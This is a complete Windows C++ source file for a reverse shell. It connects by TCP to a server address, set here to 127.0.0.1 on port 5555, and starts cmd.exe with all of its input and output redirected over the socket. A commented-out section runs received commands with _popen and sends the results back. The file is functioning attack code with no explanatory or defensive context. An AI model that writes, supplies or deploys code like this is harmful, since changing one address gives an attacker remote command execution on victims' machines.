#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment (lib, "Ws2_32.lib")

using namespace std;

string command(const char* cmd) {
    char arr[1000];
    string res;
    FILE* pipe = _popen(cmd, "r");
    if (!pipe) throw std::runtime_error("_popen() failed!");

    while (fgets(arr, 1000, pipe)) {
        res += arr;
    }
    _pclose(pipe);
    return res;
}
int main() {
    string serverIP = "127.0.0.1";
    //step one
    WSADATA wsadata;
    WORD version = MAKEWORD(2, 2);
    if (WSAStartup(version, &wsadata) != 0)
        cout << "Start up failed" << endl;
    else
        cout << "Start up successful." << endl;

    //step 2
    SOCKET client_socket = INVALID_SOCKET;
    client_socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, (unsigned int)nullptr, (unsigned int)nullptr);
    if (client_socket == INVALID_SOCKET) {
        cout << "Socket construtor failed: " << WSAGetLastError() << endl;
        WSACleanup();
        return 0;
    }
    else
        cout << "Socket created successfully" << endl;

    //step 3
    struct sockaddr_in client_info;
    int port = 5555;
    client_info.sin_family = AF_INET;
    //InetPton(AF_INET, __TEXT("127.0.0.1"), &client_info.sin_addr.S_un);
    client_info.sin_port = htons(port);
    client_info.sin_addr.s_addr = inet_addr(serverIP.c_str());
    if (WSAConnect(client_socket, (SOCKADDR*)&client_info, sizeof(client_info), nullptr, nullptr, nullptr, nullptr) == SOCKET_ERROR) {
        cout << "Client: connect() - fialed to connect." << endl;
        WSACleanup();
        return 0;
    }
    else {
        cout << "Client: connect() is OK." << endl << "Can start sending and receiving data..." << endl;
    }

    //step 4
    STARTUPINFOA sui;
    PROCESS_INFORMATION pi;
    memset(&sui, 0, sizeof(sui));
    sui.cb = sizeof(sui);
    sui.dwFlags = STARTF_USESTDHANDLES;
    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)client_socket;
    string process = "cmd.exe";
    if (CreateProcessA(nullptr, (LPSTR)process.c_str(), nullptr, nullptr, TRUE, 0, nullptr, nullptr, &sui, &pi)) {
        cout << "IT WORKS!!!\n";
    }
    cout << "Process ID: " << pi.dwProcessId << endl;
    WaitForSingleObject(pi.hProcess, INFINITE);

    /*
    char receive_buffer[200] = "";
    int bytecount = recv(client_socket, receive_buffer, 200, 0);
    if (bytecount < 0) {
        cout << "Client error: " << WSAGetLastError() << endl;
    }
    else {
        cout << "Data from server: " << receive_buffer << endl;
    }

    char send_buffer[1000] = "";
    string output = command(receive_buffer);
    system("cls");
    strcpy_s(send_buffer, sizeof(send_buffer), output.c_str());
    int bytes_sent = send(client_socket, send_buffer, 1000, 0);
    if (bytes_sent < 0) {
        cout << "Server error: " << WSAGetLastError() << endl;
    }
    else {
        cout << "bytes sent: " << bytes_sent << endl;
    }*/


}
